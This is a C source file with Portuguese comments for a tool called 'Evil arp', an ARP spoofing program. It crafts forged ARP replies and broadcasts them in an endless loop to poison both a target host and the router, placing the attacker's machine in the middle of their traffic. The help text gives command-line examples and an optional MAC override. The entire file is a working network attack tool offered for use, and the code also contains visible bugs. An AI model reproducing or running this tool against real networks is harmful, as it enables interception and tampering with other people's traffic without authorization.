// Evil arp - By: Usuario

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>
#include <linux/if_ether.h>
#include <net/if.h>
#include <sys/ioctl.h>

#define ETH_ALEN	6				// Tamanho de um endereço ethernet
#define ETH_HLEN	14				// Tamanho total do cabeçalho ethernet
#define	ETH_FRAME_LEN	1514		// Tamanho total de um quadro ethernet

// Cabeçalho ARP
struct arp_hdr{
	unsigned short _hardware_type;				// Tipo de hardware (ethernet = 1)
	unsigned short _protocol_type;				// Tipo do protocolo (ipv4 = 0x800)
	unsigned char _hardware_address_length;		// Tamanho do hardware (ethernet = 6)
	unsigned char _protocol_address_length;		// Tamanho do protocolo (ipv4 = 4)
	unsigned short _opcode;						// Operação (1 = ARP request / 2 = ARP reply)
	unsigned char _src_mac[ETH_ALEN];			// Endereço MAC de origem
	unsigned char _src_ip[4];					// Endereço IP de origem
	unsigned char _dest_mac[ETH_ALEN];			// Endereço MAC de destino (0x00 caso seja ARP request)
	unsigned char _dest_ip[4];					// Endereço IP de destino
	char fill[18];							    // O pacote ARP é menor que 64 bytes, aqui preenche para 64
};

struct ethhdr *ethernet_hdr; // Cabeçalho ethernet
struct arp_hdr *pacote_arp; // Pacote ARP
struct in_addr src , dest; // Ip de origem e destino
struct sockaddr destino; // Destino do pacote ARP

int getmac(char *iface , unsigned char *buf);
void ajuda(char *prog);

int main(int argc , char *argv[])
{
    int sock , bytes_send = 0 , opcao, macop = 0;
    char pacote[ETH_FRAME_LEN] , *interface , *ip_alvo, *ip_router;
    char eth_dest[ETH_ALEN] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};    // Endereço ethernet de destino
    char eth_dest_alvo[ETH_ALEN]= {0x00,0x00,0x00,0x00,0x00,0x00}; // Endereço ethernet alvo
    unsigned char mac[6];

    // Tratando os argumentos
    if(argc < 2)
    {
        ajuda(argv[0]);
        return 1;
    }
    opterr = 0; // Desativando as mensagens de erro da função getopt
    while((opcao = getopt(argc , argv , "hi:a:r:m:")) != -1)
    {
        switch(opcao)
        {
            case 'i':
                interface = optarg;
            break;

            case 'a':
                ip_alvo = optarg;
            break;

            case 'r':
                ip_router = optarg;
            break;

            case 'm':
                sscanf(optarg , "%02X:%02X:%02X:%02X:%02X:%02X" , &mac[0], &mac[1] , &mac[2] , &mac[3] , &mac[4] , &mac[5]);
                macop = 1;
            break;

            case 'h':
                ajuda(argv[0]);
                return 0;
            break;

            // Opção invalida
            case '?':
                if(optopt != 'i' || optopt != 'r' || optopt != 'm' || optopt != 'a' || optopt != 'h')
                {
                    fprintf(stderr , "[INFO]: Opção -%c invalida.\n\n", optopt);
                    ajuda(argv[0]);
                }
                else fprintf(stderr,  "[INFO]: Opção -%c necessita de um argumento\n",optopt);
                return 1;
            break;
        }
    }

    if(macop == 0);
    {
        if(getmac(interface , mac) == 0);
        else
        {
            fprintf(stderr ,"[INFO]: Erro ao obter endereço mac da interface: %s\n",interface);
            return 1;   
        }
    }
    
    // Criando o socket
	sock = socket(AF_INET , SOCK_PACKET , htons(0x0003));
    if(sock == -1 )
    {
        fputs("[INFO]: Erro ao criar socket.\n", stderr);
        return 1;
    }

    // Construindo pacote ethernet
    ethernet_hdr = (struct ethhdr *)pacote;
    memcpy(ethernet_hdr->h_dest , eth_dest , ETH_ALEN);
    ethernet_hdr->h_proto = htons(0x0806); // Codigo do protocolo ARP

    // Construindo pacote ARP
    pacote_arp = pacote + ETH_HLEN;
    pacote_arp->_hardware_type = htons(0x01); // Tipo de hardware: ethernet
    pacote_arp->_protocol_type = htons(0x800); // Tipo de protocolo: ipv4
    pacote_arp->_hardware_address_length = ETH_ALEN; // Tamanho do endereço de hardware
    pacote_arp->_protocol_address_length = 4; // Tamanho do protocolo 
    pacote_arp->_opcode = htons(0x0002); // Codigo de operação: 2 (ARP reply)

    // Endereço Mac de origem
    memcpy(pacote_arp->_src_mac , mac , 6);
    memcpy(ethernet_hdr->h_source , mac , 6);

    // Mac de destino
    memcpy(pacote_arp->_dest_mac , eth_dest_alvo , ETH_ALEN);
    memset(pacote_arp->fill , 0 , 18); // Completando 64 bytes

    // Interface que vai ser usada
    strcpy(destino.sa_data , interface);

    while(1)
    {
        // Setando o ip do rounter como origem
        src.s_addr = inet_addr(ip_router);
        memcpy(pacote_arp->_src_ip , &src.s_addr , 4);

        // Endereço IP da maquina alvo
        dest.s_addr = inet_addr(ip_alvo);
        memcpy(pacote_arp->_dest_ip , &dest.s_addr , 4);

        // Enviando o primeiro pacote
        bytes_send = sendto(sock , pacote , 64 , 0 , &destino , sizeof(destino));
        if(bytes_send <= 0) fputs("[INFO]: Erro ao enviar o pacote.\n",stderr);
        else printf("Evil reply: %s is at %02X:%02X:%02X:%02X:%02X:%02X Bytes: %i\n",ip_router , mac[0], mac[1] , mac[2] , mac[3] , mac[4] , mac[5], bytes_send);

        sleep(3);

        // Setando o ip da vitima como origem
        src.s_addr = inet_addr(ip_alvo);
        memcpy(pacote_arp->_src_ip , &src.s_addr , 4);

        // Endereço IP do router
        dest.s_addr = inet_addr(ip_router);
        memcpy(pacote_arp->_dest_ip , &dest.s_addr , 4);

        // Enviando o segundo pacote
        bytes_send = sendto(sock , pacote , 64 , 0 , &destino , sizeof(destino));
        if(bytes_send <= 0) fputs("[INFO]: Erro ao enviar o pacote.\n",stderr);
        else printf("Evil reply: %s is at %02X:%02X:%02X:%02X:%02X:%02X Bytes:%i\n",ip_alvo , mac[0], mac[1] , mac[2] , mac[3] , mac[4] , mac[5] ,bytes_send);

        sleep(3);
    }

    close(sock);
    return 0;
}

// Obtendo o endereço MAC de uma interface
int getmac(char *iface , unsigned char *buf)
{
    int sock;
    struct ifreq ifr;
    char macaddr[13];

    sock = socket(AF_INET , SOCK_DGRAM , 0);
    if(sock == -1) return -1;

    ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name , iface , IFNAMSIZ -1);

	if(ioctl(sock , SIOCGIFHWADDR , &ifr) == 0)
    {
        for(int i = 0; i < ETH_ALEN; i++) sprintf(&macaddr[i*2] , "%02X" ,((unsigned char *)ifr.ifr_hwaddr.sa_data)[i]);
        macaddr[13] = '\0';
        sscanf(macaddr , "%02X%02X%02X%02X%02X%02X" , &buf[0], &buf[1] , &buf[2] , &buf[3] , &buf[4] , &buf[5]);
    }else return -1;

    close(sock);
    return 0;

}

// Menu de ajuda
void ajuda(char *prog)
{
    fprintf(stderr , "Use: %s [OPÇÃO]\n", prog);
    fprintf(stderr , "Opções: -i [INTERFACE DE REDE] -r [IP ROUTER] -a [IP ALVO] -m [MAC ADDR] -h [AJUDA]\n\n");
    fprintf(stderr , "Exemplos:\n");
    fprintf(stderr , "%s -i eth0 -r 192.168.0.1 -a 192.168.0.80\n%s -i eth0 -r 192.168.0.1 -a 192.168.0.80 -m 9C:67:88:70:2A:CA\n",prog , prog);
    
    return;   
}